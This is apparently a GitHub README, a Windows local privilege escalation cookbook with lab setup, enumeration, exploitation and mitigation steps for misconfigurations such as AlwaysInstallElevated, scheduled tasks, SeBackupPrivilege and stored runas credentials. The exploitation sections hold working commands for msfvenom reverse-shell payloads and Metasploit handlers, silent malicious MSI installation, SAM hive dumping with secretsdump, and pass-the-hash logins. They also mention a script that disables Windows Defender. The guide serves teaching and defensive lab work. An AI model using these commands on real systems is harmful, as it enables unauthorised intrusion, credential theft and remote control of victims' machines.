# Windows Local Privilege Escalation CookBook
<p align="center">
  <img src="/Pictures/Windows-Funny.jpg">
</p>

## Description (Keynote)

This CookBook was created with the main purpose of helping people understand local privilege escalation techniques on Windows environments. Moreover, it can be used for both attacking and defensive purposes.

:information_source: This CookBook focuses only on misconfiguration vulnerabilities on Windows workstations/servers/machines.

:warning: Evasion techniques to bypass security protections, endpoints, and antivirus are not included in this cookbook. I created this PowerShell script, [TurnOffAV.ps1](/Lab-Setup-Scripts/TurnOffAV.ps1), which permanently disables Windows Defender. Run this with local Administrator privileges.

The main structure of this CookBook includes the following sections:

- Description (of the vulnerability)
- Lab Setup
- Enumeration
- Exploitation
- Mitigation
- (Useful) References

I hope to find this CookBook useful and learn new stuff 😉.

## Table of Contents

- [Windows Local Privilege Escalation CookBook](#windows-local-privilege-escalation-cookbook)
  - [Description (Keynote)](#description-keynote)
  - [Table of Contents](#table-of-contents)
  - [Useful Tools](#useful-tools)
  - [Vulnerabilities](#vulnerabilities)
    - [AlwaysInstallElevated](#alwaysinstallelevated)
      - [Description](#description)
      - [Lab Setup](#lab-setup)
      - [Enumeration](#enumeration)
      - [Exploitation](#exploitation)
      - [Mitigation](#mitigation)
  - [References](#references)

## Useful Tools

In the following table, some popular and useful tools for Windows local privilege escalation are presented:

| Name | Language | Description |
| ---- |:-----------:|:-----------:|
| [SharpUp](https://github.com/GhostPack/SharpUp) | C# | SharpUp is a C# port of various PowerUp functionality |
| [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) | PowerShell | PowerUp aims to be a clearinghouse of common Windows privilege escalation |
| [BeRoot](https://github.com/AlessandroZ/BeRoot) | Python | BeRoot(s) is a post exploitation tool to check common Windows misconfigurations to find a way to escalate our privilege |
| [Privesc](https://github.com/enjoiz/Privesc) | PowerShell | Windows PowerShell script that finds misconfiguration issues which can lead to privilege escalation |
| [Winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe) | C# | Windows local Privilege Escalation Awesome Script |

## Vulnerabilities

This CookBook presents the following Windows vulnerabilities:

- [AlwaysInstallElevated](#alwaysinstallelevated)
- [Autoruns (Registry Run Keys)](#autoruns-registry-run-keys)
- [Autoruns (Startup Folder)](#autoruns-startup-folder)
- [Leaked Credentials (PowerShell History)](#leaked-credentials-powershell-history)
- [Scheduled Task/Job](#scheduled-taskjob)
- [SeBackupPrivilege](#sebackupprivilege)
- [SeImpersonatePrivilege](#seimpersonateprivilege)
- [Stored Credentials (Runas)](#stored-credentials-runas)
- [Unquoted Service Path](#unquoted-service-path)
- [Weak Service Binary Permissions](#weak-service-binary-permissions)
- [Weak Service Permissions](#weak-service-permissions)
- [Weak Registry Permissions](#weak-registry-permissions)

### AlwaysInstallElevated

#### Description

"AlwaysInstallElevated" is a Windows Registry setting that affects the behavior of the Windows Installer service. The vulnerability arises when the "AlwaysInstallElevated" registry key is configured with a value of "1" in the Windows Registry.

When this registry key is enabled, it allows non-administrator users to install software packages with elevated privileges. In other words, users who shouldn't have administrative rights can exploit this vulnerability to execute arbitrary code with elevated permissions, potentially compromising the security of the system.

#### Lab Setup

##### Manual Lab Setup

Open a cmd with local Administrator privileges and type `gpedit.msc` to open the Local Group Policy Editor.

1) Navigate to **Computer Configuration** -> **Administrative Templates** -> **Windows Components** -> **Windows Installer**:

![AlwaysInstallElevated-Computer-Configuratior-1](/Pictures/AllwaysInstallElevated-Computer-1.png)

2) Enable the "**Always install with elevated privileges**" policy:

![AlwaysInstallElevated-Computer-Configuratior-2](/Pictures/AllwaysInstallElevated-Computer-2.png)

3) Confirm that the "**Always install with elevated privileges**" policy is set to **Enabled**:

![AlwaysInstallElevated-Computer-Configuratior-3](/Pictures/AllwaysInstallElevated-Computer-3.png)

4) Then, navigate to **User Configuration** -> **Administrative Templates** -> **Windows Components** -> **Windows Installer**:

![AlwaysInstallElevated-User-Configuratior-4](/Pictures/AllwaysInstallElevated-User-4.png)

5) Enable the "**Always install with elevated privileges**" policy:

![AlwaysInstallElevated-User-Configuratior-5](/Pictures/AllwaysInstallElevated-User-5.png)

6) Confirm that the "**Always install with elevated privileges**" policy is set to **Enabled**:

![AlwaysInstallElevated-User-Configuratior-6](/Pictures/AllwaysInstallElevated-User-6.png)

7) Open the command prompt with local Administrator privileges and execute the following command to update the computer policy:

```
gpupdate /force
```

Outcome:

![Update-Computer-Policy](/Pictures/Update-Computer-Policy.png)

##### PowerShell Script Lab Setup 

Another way to set up the lab with the 'AlwaysInstallElevated' vulnerability is by using the custom PowerShell script named [AlwaysInstallElevated.ps1](/Lab-Setup-Scripts/AlwaysInstallElevated.ps1).

Open a PowerShelll with local Administrator privileges and run the script:

```
.\AlwaysInstallElevated.ps1
```

Outcome:

![AlwaysInstallElevated-Lab-Setup-Script](/Pictures/AllwaysInstallElevated-Lab-Setup-Script.png)

#### Enumeration

##### Manual Enumeration

To perform manual enumeration and identify whether a Windows workstation is vulnerable to the AlwaysInstallElevated issue, you can use the following commands from a command prompt:

```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

and

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Outcome:

![AlwaysInstallElevated-Manual-Enumeration](/Pictures/AlwaysInstallElevated-Manual-Enumeration.png)

:information_source: If either command returns a value of 1, it indicates a potential vulnerability, enabling non-administrative users to install software with elevated privileges. 

##### Tool Enumeration

To run the [SharpUp](https://github.com/GhostPack/SharpUp) tool and perform an enumeration of the `AlwaysInstallElevated` vulnerability, you can execute the following command with appropriate arguments:

```
SharpUp.exe audit AlwaysInstallElevated
```

Outcome:

![AlwaysInstallElevated-SharpUp](/Pictures/AlwaysInstallElevated-SharpUp.png)

:information_source: Moreover, you can use `SharpUp.exe audit` to perform a comprehensive enumeration of all misconfigurations vulnerabilities on the specified machine.

#### Exploitation

##### Manual Exploitation

:information_source: In order to create a MSI file with Visual Studio, you should have pre-installed the extension named **Mictosoft Visual Studio Installer Projects 2022**.

Go to **Extensions** tab -> **Manage extensions** in Visual Studio. Go to the Online section, look for the extension, and download it. 

![Add-Exetnsion-In-Visual-Studio](/Pictures/Add-Exetension-Visula-Studio.png)

The installation will be scheduled after you close Visual Studio. When you reopen it, the extension will be ready to use.

:warning: If the extension is already pre-installed, please disregard the above steps.

To create a malicious MSI in Visual Studio follow the below steps:

1) Open Visual studio, select **Create a new project** and type **installer** into search box. Select the **Setup Wizard** project and click **Next**:

![Visual-Studio-MSI-1](/Pictures/Visual-Studio-MSI-1.png)

2) Provide the project with a name, for example, **NCVInstaller**. Choose a location, for example, **C:\Payloads**, opt for **placing the solution and project in the same directory**, and then click on **Create**:

![Visual-Studio-MSI-2](/Pictures/Visual-Studio-MSI-2.png)

3) Keep clicking **Next** button until you get to step 3 of 4 (choose files to include). Click **Add** and select a malicous payload (i.e, an exe from msfvenom). Then click **Finish**:

![Visual-Studio-MSI-3](/Pictures/Visual-Studio-MSI-3.png)

4) Highlight the **NCVInstaller** project in the **Solution Explorer** and in the **Properties**, change the **TargetPlatform** from **x86** to **x64**:

![Visual-Studio-MSI-4](/Pictures/Visual-Studio-MSI-4.png)

5) Now right-click on the project and select **View** > **Custom Actions**:

![Visual-Studio-MSI-5](/Pictures/Visual-Studio-MSI-5.png)

6) Right-click on **Install** option and select **Add Custom Action**:

![Visual-Studio-MSI-6](/Pictures/Visual-Studio-MSI-6.png)

7) Double-click on **Application Folder**, select your malicious executable file (i.e, nickvourd.exe) and click **OK**. This will ensure that the malicious payload is executed as soon as the installer is run.

![Visual-Studio-MSI-7](/Pictures/Visual-Studio-MSI-7.png)

8) Change **Run64Bit** option from **False** to **True**:

![Visual-Studio-MSI-8](/Pictures/Visual-Studio-MSI-8.png)

9)  Build the solution.

10) Configure Metasploit's handler according to your selected MSI payload preferences:

```
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <ip_address>; set LPORT <port>; set EXITFUNC thread; set ExitOnSession false; exploit -j -z"
```

![Metasploit-Configuration](/Pictures/Metasploit-Configuration.png)

11) Transfer the malicious MSI file to the victim's machine.

12) Initiate the installation process for the malicious MSI package silently without any user interface:

```
msiexec /quiet /qn /i NCVInstaller.msi
```

![MSI-Execution](/Pictures/MSI-Execution.png)

13) Confirm that the new session is with elevated privileges:

![Elevated-Privileges-Confirmation](/Pictures/Elevated-Privileges-Confirmation.png)

:information_source: In order to remove the malicious MSI file from the victim, run the following command (in a unprivilege session):

```
msiexec /q /n /uninstall NCVInstaller.msi
```

##### Tool Exploitation

1) To perform exploitation with [msfvenom](https://github.com/rapid7/metasploit-framework), you can use the following command to create a malicious MSI file:

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=1234 EXITFUNC=thread -f msi > nickvourd.msi
```

Outcome:

![Msfvenom-Create-MSI](/Pictures/Msfvenom-Create-MSI.png)

2) Configure Metasploit's handler according to your selected MSI payload preferences:

```
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST eth0; set LPORT 1234; set EXITFUNC thread; set ExitOnSession false; exploit -j -z"
```

3) Transfer the malicious MSI file to the victim's machine.

4) Initiate the installation process for the malicious MSI package silently without any user interface:

```
msiexec /quiet /qn /i nickvourd.msi
```

Outcome:

![AlwaysInstallElevated-New-Session](/Pictures/AlwaysInstallElevated-New-Session.png)

5) Confirm that the new session is with elevated privileges:

![AlwaysInstallElevated-Elevated-Privileges](/Pictures/AlwaysInstallElevated-Elevated-Privileges.png)

:information_source: In order to remove MSI file from the victim, run the following command (in a unprivilege session):

```
msiexec /q /n /uninstall nickvourd.msi
```

#### Mitigation

To mitigate the `AlwaysInstallElevated` vulnerability, it is recommended to set the `AlwaysInstallElevated` value to `0` in both the `HKEY_LOCAL_MACHINE` and `HKEY_CURRENT_USER` hives in the Windows Registry.

### Autoruns (Registry Run Keys)

### Autoruns (Startup Folder)

### Leaked Credentials (PowerShell History)

#### Description

PowerShell history records previously run commands, including any sensitive data such as passwords. Unauthorized access to this history could lead to credential leaks, and might to privilege escalation.

#### Lab Setup

1) Open a Powershell with local Administrator privileges and run the following command to create a new user:

```
net user nikos Passw0rd! /add
```
2) Add the new user to Administrators group:

```
net localgroup "Administrators" nikos /add
```

3) Add the new user to Remote Desktop Users group:

```
net localgroup "Remote Desktop Users" nikos /add
```

4) Enable Remote Desktop Service:

```
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

Outcome:

![Leaked-Creds-PS-History-Manual-Lab-Setup](/Pictures/Leaked-Credentials-PS-Manual-Lab-setup.png)

#### Enumeration

To observe the leaked credentials, you should read the `C:\Users\<User>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` PowerShell history file.

![Leaked-Creds-PS-History-Enumeration](/Pictures/Leaked-Credentials-PS-Enumeration.png)

#### Exploitation

Use these credentials to connect to a remote service or application. In this scenario, you can use these credentials to connect as "nikos" (Administrator group) via RDP to the victim's machine.

![Leaked-Creds-PS-History-Exploitation](/Pictures/Leaked-Credentials-PS-Exploitation.png)

#### Mitigation

To clear the PowerShell history file, you can delete the content of the file directly:

1) Open PowerShell.

2) Run the following command: 

```
Clear-Content -Path "C:\Users\<User>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```

### Scheduled Task/Job

#### Description

The Task Scheduler is a Windows feature that enables users to automate the execution of tasks or programs at specific times or under particular conditions.

Attackers can exploit pre-configured tasks associated with privileged accounts to gain elevated access. By manipulating these tasks, they can run unauthorized programs, scripts, or commands, thereby exerting more control over the system than intended.

#### Lab Setup

1) Create a folder named 'Jobs' in the C:\ directory.

2) Download the file [Monitor_AMD64.exe](/Lab-Setup-Binary/Monitor_AMD64.exe) to the 'C:\Jobs' directory.

3) Open a Command Prompt with local Administrator privileges and run the following command to grant write permissions to all built-in users for the 'C:\Jobs' directory:

```
icacls "C:\Jobs" /grant Users:(OI)(CI)M
```

Outcome:

![Grant-Write-Permissions-To-All-Built-in-Users](/Pictures/Taskscheduler-0.png)

4) Then, run this command `taskschd.msc` to open the Task Scheduler.

5) Create a new task on Task Scheduler:

![Create-A-New-Task](/Pictures/Taskscheduler-2.png)

6) Assign a task to the logged-in user to be executed with the highest privileges:

![Create-A-New-Task-2](/Pictures/Taskscheduler-3.png)

7) Select the trigger tab to initiate a scheduled task:

![Create-A-New-Task-3](/Pictures/Taskscheduler-4.png)

8) Configure the task schedule trigger to recur:

![Create-A-New-Task-4](/Pictures/Taskscheduler-5.png)

9) Specify the action that will occur when your task starts:

![Create-A-New-Task-5](/Pictures/Taskscheduler-6.png)

10) Specify the type of action to be performed by a scheduled task:

![Create-A-New-Task-6](/Pictures/Taskscheduler-7.png)

11) Verify the schedule task:

![Verify-New-Task](/Pictures/Taskscheduler-8.png)

#### Enumeration

To find all scheduled tasks of the current user using the Command Prompt, you can use the `schtasks` command:

```
schtasks /query /fo LIST /v
```

Outcome:

![Task-Scheduler-Enumeration](/Pictures/Taskscheduler-Enumeration.png)

#### Exploitaion

1) Use msfvenom to generate a malicious executable (exe) file that can be executed via the 'MagicTask' scheduled task:

```
msfvenom -p windows/x64/shell_reverse_tcp lhost=eth0 lport=1234 -f exe > shell.exe
```

2) Transfer the malicious executable file to victim's machine.

3) Move the malicious executable file to 'C:\Jobs'.

4) Rename the 'Monitor_AMD64.exe' to 'Monitor_AMD64.bak'.

5) Rename the malicious exe (shell.exe) to 'Monitor_AMD64.exe'.

Outcome:

![Task-Scheduler-All-Above-Actions](/Pictures/Taskscheduler-10.png)

6) Open a listener on your Kali machine.

7) Wait five minutes and verify the reverse shell on your Kali machine:

![Task-Scheduler-Verify-Reverse-Shell](/Pictures/Taskscheduler-11.png)

#### Mitigation

### SeBackupPrivilege

#### Description

The SeBackupPrivilege is a Windows privilege that provides a user or process with the ability to read files and directories, regardless of the security settings on those objects. This privilege can be used by certain backup programs or processes that require the capability to back up or copy files that would not normally be accessible to the user. 

However, if this privilege is not properly managed or if it is granted to unauthorized users or processes, it can lead to a privilege escalation vulnerability. The SeBackupPrivilege vulnerability can be exploited by malicious actors to gain unauthorized access to sensitive files and data on a system.

#### Lab Setup

##### Manual Lab Setup

1) Open a PowerShell with local Administrator privileges and run the following command to create a new user:

```
net user ncv Passw0rd! /add
```

2) Run the following command to enable the WinRM service:

```
Enable-PSRemoting -Force
```

:information_source: If you are encountering an error in enabling of WinRM and WinRM is not functioning, please follow these steps:

- Go to Settings > Network & Internet.
- Choose either "Ethernet" or "Wi-Fi," depending on your current network connection.
- Under the network profile, set the location to "Private."
- Lastly, execute the following command with Local Administrator privileges to enable PS remoting: `Set-WSManQuickConfig`.

3) Run the following command to add new user to "Remote Management Users" Group:

```
net localgroup "Remote Management Users" ncv /add
```

4) Run the following commands to install and import the Carbon module:

```
Install-Module -Name carbon -Force
```

 and 

 ```
 Import-Module carbon
 ```

 5) Use the following cmdlets to grant the SeBackupPrivilege to the new user and verify the privilege:

 ```
 Grant-CPrivilege -Identity ncv -Privilege SeBackupPrivilege
 ```

 and

 ```
 Test-CPrivilege -Identity ncv -Privilege SeBackupPrivilege
 ```

Outcome:

![SebackupPrivilege-Manual-Setup](/Pictures/SeBackUp-Manual-Setup.png)

##### PowerShell Script Lab Setup 

Another way to set up the lab with the 'SeBackupPrivilege' vulnerability is by using the custom PowerShell script named [SeBackupPrivilege.ps1](/Lab-Setup-Scripts/SeBackupPrivilege.ps1).

Open a PowerShelll with local Administrator privileges and run the script:

```
.\SeBackupPrivilege.ps1
```

Outcome:

![SebackupPrivilege-Script-Setup](/Pictures/SeBackUp-Script.png)

#### Enumeration

##### Manual Enumeration

To perform manual enumeration, you can open a command prompt and use the following command to enumerate the current privileges of the user:

```
whoami /priv
```

Outcome:

![SeBackupPrivilege-Manual-Enumeration](/Pictures/SeBackUp-Manual-Enum.png)

##### Tool Enumeration

To run the [SharpUp](https://github.com/GhostPack/SharpUp) tool and perform an enumeration of the `SeBackupPrivilege` vulnerability, you can execute the following command with appropriate arguments:

```
SharpUp.exe audit TokenPrivileges
```

Outcome:

![SeBackupPrivilege-Tool-Enumeration](/Pictures/SeBackUp-Tool-Enum.png)

#### Exploitation

To abuse this vulnerability you should follow these steps:

1) Create a temp directory:

```
mkdir C:\temp
```

2) Copy the sam and system hive of HKLM to C:\temp and then download them.

```
reg save hklm\sam C:\temp\sam.hive
```

and

```
reg save hklm\system C:\temp\system.hive
```

Outcome:

![SeBackupPrivilege-Exploitation-Copy-Hives](/Pictures/SeBackUp-Exploitation-1.png)

3) Use [impacket-secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) tool (Kali Linux Default) and obtain ntlm hashes:

```
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

Outcome:

![SeBackupPrivilege-Exploitation-Observe-NTLM-Hashes](/Pictures/SeBackUp-Exploitation-2.png)

4) Use again evil-winrm to pass the hash and connect as Local Administrator:

```
evil-winrm -i 192.168.146.130 -u "Nikos Vourdas" -H "20117ce437cde2e30f4612c4c82196b0"
```

Outcome:

![SeBackupPrivilege-Exploitation-Evil-WinRM-Pass-The-Hash](/Pictures/SeBackUp-Exploitation-3.png)

#### Mitigation

Follow the steps below to remove the `SeBackupPrivilege` from a user:

1) Press Win + R to open the Run dialog, type `secpol.msc`, and hit Enter. This will open the Local Security Policy editor.

2) In the Local Security Policy editor, navigate to **Local Policies** > **User Rights Assignment**.

3) Look for the **Back up files and directories** policy (which corresponds to SeBackupPrivilege).

4) Double-click the policy, and a properties window will appear.

5) In the properties window, you can remove the user or group from the list to revoke the privilege. Click **Apply** and then **OK** to save the changes.

### SeImpersonatePrivilege

### Stored Credentials (Runas)

#### Description

The Credentials Manager is a feature in Windows that securely stores usernames and passwords for websites, applications, and network resources. This component is particularly helpful for users who want to manage and retrieve their login information easily without having to remember each set of credentials.

In a scenario where an attacker has compromised an account with access to the Windows Credentials Manager and has obtained stored credentials from an elevated account, he can potentially use the "runas" command to elevate his privileges and gain unauthorized access. 

#### Lab Setup

##### Manual Lab Setup

1) Open a command-prompt with local Administrator privileges and create a new user with the following command:

```
net user nickvourd Passw0rd! /add
```

2) Add the new user to Administrator's local group:

```
net localgroup "Administrators" nickvourd /add
```

3) Save credentials to Windows Credentials Manager:

```
runas /savecred /user:WORKGROUP\nickvourd cmd.exe
```

Outcome:

![Stored-Creds-Manual-Lab-Setup](/Pictures/Stored-Creds-Manual-Lab-Set-Up.png)

4) Verify the new stored credentials on Windows Credentials Manager (**Control Panel** > **User Accounts** > **Credential Manager**):

![Stored-Creds-Verify-New-Windows-Creds](/Pictures/Stored-Creds-Control-Panel-4.png)

##### PowerShell Script Lab Setup

Another way to set up the lab with the 'Stored Credentials (Runas)' scenario is by using the custom PowerShell script named [StoredCredentialsRunas.ps1](/Lab-Setup-Scripts/StoredCredentialsRunas.ps1).

Open a PowerShelll with local Administrator privileges and run the script:

```
.\StoredCredentialsRunas.ps1
```

:information_source: Please provide the password generated for the `runas` command.

Outcome:

![Stored-Creds-Tool-Lab-Setup](/Pictures/Stored-Creds-Tool-Lab-Set-Up.png)

#### Enumeration

To perform enumeration, you can open a command prompt and use the following command to enumerate the stored credentials in the Windows Credentials Manager:

```
cmdkey /list
```

Outcome:

![Stored-Creds-Enum](/Pictures/Stored-Creds-Enum.png)

#### Exploitaion

To abuse this scenario you should follow these steps:

1) Create with msfvenom a malicous executable file (i.e., nikos.exe):

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=1234 -f exe > nikos.exe
```

2) Transfer the malicious executable file to victim's machine.

3) open a listener from your attacking machine:

```
nc -lvp 1234
```

4) Grant full access permissions to all users:

```
icacls "C:\Windows\Tasks\nikos.exe" /grant Users:F
```

5) Open a command-prompt with regular user privileges and execute the following command:

```
runas /savecred /user:WORKGROUP\nickvourd "C:\Windows\Tasks\nikos.exe"
```

Outcome:

![Stored-Creds-Exploitation-Victim-Side](/Pictures/Stored-Creds-Explotation-1.png)

6) Verify the new reverse shell from your attacking machine:

![Stored-Creds-Exploitation-Attacker-Side](/Pictures/Stored-Creds-Exploitation-2.png)

#### Mitigation

To mitigate stored credentials from Windows Credentials manager. Please follow these steps:

1) Open **Control Panel** and navigate **User Accounts** > **Credential Manager**:

![Stored-Creds-Control-Panel](/Pictures/Stored-Creds-Control-Panel.png)

2) Select **Windows Credentials**, choose your preferred stored credentials, and select the **remove** option:

![Stored-Creds-Remove-Creds](/Pictures/Stored-Creds-Control-Panel-2.png)

3) Select the option "Yes" on the pop-up window:

![Stored-Creds-Remove-Creds-Confirmation](/Pictures/Stored-Creds-Control-Panel-3.png)

4) Verify that the stored credentials have been successfully removed from the Windows Credentials Manager:

![Stored-Creds-Remove-Creds-Verification](/Pictures/Stored-Creds-Control-Panel-5.png)

### Unquoted Service Path

### Weak Service Binary Permissions

### Weak Service Permissions

### Weak Registry Permissions

## References

- [Privilege Escalation Wikipedia](https://en.wikipedia.org/wiki/Privilege_escalation)
- [AlwaysInstallElevated Microsoft](https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated)
- [SharpCollection GitHub by Flangvik](https://github.com/Flangvik/SharpCollection)
- [Windows Installer Microsoft](https://learn.microsoft.com/en-us/windows/win32/msi/windows-installer-portal)
- [How to Create the Windows Installer File (*.msi) Microsoft](https://learn.microsoft.com/en-us/mem/configmgr/develop/apps/how-to-create-the-windows-installer-file-msi)
- [Metasploit Website](https://www.metasploit.com/)
- [Evil-WinRM GitHub by Hackplayers](https://github.com/Hackplayers/evil-winrm)
- [Windows Privilege Escalation Youtube Playlist by Conda](https://www.youtube.com/watch?v=WWE7VIpgd5I&list=PLDrNMcTNhhYrBNZ_FdtMq-gLFQeUZFzWV&index=13)
- [Interactive Logon Authentication Microsoft](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-authsod/bfc67803-2c41-4fde-8519-adace79465f6)